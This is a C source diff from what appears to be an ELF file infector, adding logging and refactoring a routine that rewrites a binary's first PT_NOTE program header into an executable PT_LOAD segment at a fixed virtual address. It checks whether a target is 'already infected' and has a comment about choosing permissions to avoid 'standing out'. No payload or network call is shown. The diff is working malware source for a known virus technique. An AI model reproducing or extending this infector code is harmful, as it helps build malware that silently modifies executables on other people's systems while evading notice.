@@ -28,6 +28,7 @@ void exit_on_error(FILE *fp, char *err) {
 /*
   Simple colorful logging function
 */
+//TODO: Make it so this function can accept arguments
 void log_msg(char *log) {
   fprintf(stdout, "\033[0;34m[+] %s\n\033[0m", log);
 }
@@ -45,7 +46,7 @@ void log_msg(char *log) {
   TODO: We probably just need R-X perms, so confirm this and then
   change it to avoid standing out.
 */
-void note_to_load(FILE *fp) {
+void note_to_load(FILE *fp, Elf64_Phdr *new_load) {
   unsigned int perms = 7; 
   unsigned int type = 1;
 
@@ -55,9 +56,9 @@ void note_to_load(FILE *fp) {
   fwrite(&perms, sizeof(perms), 1, fp); // Write the FLAGS to the second 4 bytes of the header
   fseek(fp, 8, SEEK_CUR);               // Jump 8 bytes to skip the OFFSET flag (this is already good to go)
   fwrite(&VADDR, sizeof(VADDR), 1, fp); // Write 8 bytes to the VADDR (where we will jump)
-  fseek(fp, 32, SEEK_CUR);              // Jump to where we were when we called this function
+  fseek(fp, -24, SEEK_CUR);
 
-  return;
+  parse_program_header(fp, new_load);
 }
 
 /*
@@ -71,13 +72,14 @@ void parse_elf(FILE *fp) {
 
   ehdr = malloc(sizeof(*ehdr));
 
-  log_msg("ELF Header");
+  log_msg("Parsing ELF header...");
   parse_elf_header(fp, ehdr);
 
   unsigned short phdr_count = ehdr->e_phnum;
   Elf64_Phdr *phdr = malloc(phdr_count * sizeof(*phdr));
+  Elf64_Phdr *new_load = malloc(sizeof(*new_load));;
 
-  log_msg("Program Headers");
+  log_msg("Parsing program headers...");
   for (int i = 0; i < phdr_count; i++) {
     parse_program_header(fp, &phdr[i]);
 
@@ -89,6 +91,8 @@ void parse_elf(FILE *fp) {
       appear in a legit binary, but it's worked up til now, so /shrug
     */
     if (phdr[i].p_type == 1 && phdr[i].p_vaddr == VADDR) {
+      log_msg("Found LOAD with our VADDR...");
+      print_program_header(&phdr[i]);
       exit_on_error(fp, "Hmmm... Looks like we have already infected this binary...");
     }
 
@@ -98,12 +102,25 @@ void parse_elf(FILE *fp) {
     */
     if (phdr[i].p_type == 4 && note_count == 0) {
       note_count++;
-      note_to_load(fp);
+      note_to_load(fp, new_load);
+      log_msg("Converted NOTE:");
+      print_program_header(&phdr[i]);
+      log_msg("To LOAD:");
+      print_program_header(new_load);
     }
   }
 
+  // TODO: Make two functions. The convert and the print. Would be nice to have this be also an elf analysis tool.
+  //log_msg("ELF Header");
+  //print_elf_header(ehdr);
+  //log_msg("Program Headers");
+  //for (int i = 0; i < phdr_count; i++) {
+  //  print_program_header(&phdr[i]);
+  //}
+
   free(ehdr);
   free(phdr);
+  free(new_load);
 
   return;
 }
